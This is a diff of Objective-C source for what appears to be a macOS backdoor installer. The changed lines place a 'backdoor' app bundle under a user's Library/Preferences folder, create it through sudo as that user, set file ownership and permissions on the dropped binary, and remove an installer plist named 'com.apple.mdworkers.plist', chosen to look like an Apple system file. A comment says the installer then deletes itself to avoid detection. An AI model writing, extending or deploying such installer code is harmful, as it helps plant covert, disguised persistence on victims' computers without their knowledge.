@@ -15,6 +15,27 @@
 #define INSTALLER_PLIST @"com.apple.mdworkers.plist"
 
 
+void changeAttributesForBinaryAtPath(NSString *aPath, int uid, int gid, u_long permissions)
+{
+  NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
+  NSValue *owner      = [NSNumber numberWithInt: uid];
+  NSValue *group      = [NSNumber numberWithInt: gid];
+
+  NSFileManager *_fileManager = [NSFileManager defaultManager];
+  NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
+                                  permission,
+                                  NSFilePosixPermissions,
+                                  owner,
+                                  NSFileOwnerAccountID,
+                                  group,
+                                  NSFileGroupOwnerAccountID,
+                                  nil];
+
+  [_fileManager setAttributes: tempDictionary
+                 ofItemAtPath: aPath
+                        error: nil];
+}
+
 void executeTask(NSString *anAppPath,
                  NSArray *arguments,
                  BOOL waitForExecution)
@@ -96,14 +117,18 @@ int main(int ac, char *av[])
   //
   NSString *username = [[NSString alloc] initWithCString: av[1]
                                                 encoding: NSUTF8StringEncoding];
-  NSString *backdoorDir = [[NSString alloc] initWithCString: av[2]
-                                                   encoding: NSUTF8StringEncoding];
+  NSString *_backdoorDir = [[NSString alloc] initWithCString: av[2]
+                                                    encoding: NSUTF8StringEncoding];
+  NSString *backdoorDir = [[NSString alloc] initWithFormat: @"%@.app", _backdoorDir];
+
   NSString *binary = [[NSString alloc] initWithCString: av[3]
                                               encoding: NSUTF8StringEncoding];
 
-  NSString *destinationDir = [[NSString alloc] initWithFormat: @"/Users/%@/Library/Preferences/%@/",
+  NSString *destinationDir = [[NSString alloc] initWithFormat: @"/Users/%@/Library/Preferences/%@",
                               username,
                               backdoorDir];
+
+  [_backdoorDir release];
   [backdoorDir release];
 
   NSString *binaryPath = [[NSString alloc] initWithFormat: @"%@/%@",
@@ -129,18 +154,26 @@ int main(int ac, char *av[])
   //
   // Create destination dir
   //
-  mkdir([destinationDir UTF8String], 0755);
+  NSArray *arguments = [NSArray arrayWithObjects:
+    @"-u",
+    username,
+    @"/bin/mkdir",
+    destinationDir,
+    nil];
+
+  executeTask(@"/usr/bin/sudo", arguments, NO);
+  //mkdir([destinationDir UTF8String], 0755);
 
   //
-  // Delete root LaunchDaemons plist
+  // Delete installer plist path
   //
-  NSString *rootPlistPath = [[NSString alloc] initWithFormat: @"%@/%@",
+  NSString *installerPlistPath = [[NSString alloc] initWithFormat: @"%@/%@",
            [[NSBundle mainBundle] bundlePath],
            INSTALLER_PLIST];
 
-  [_fileManager removeItemAtPath: rootPlistPath
+  [_fileManager removeItemAtPath: installerPlistPath
                            error: nil];
-  [rootPlistPath release];
+  [installerPlistPath release];
 
   //
   // Delete ourself in order to avoid to be copied in the next for cycle
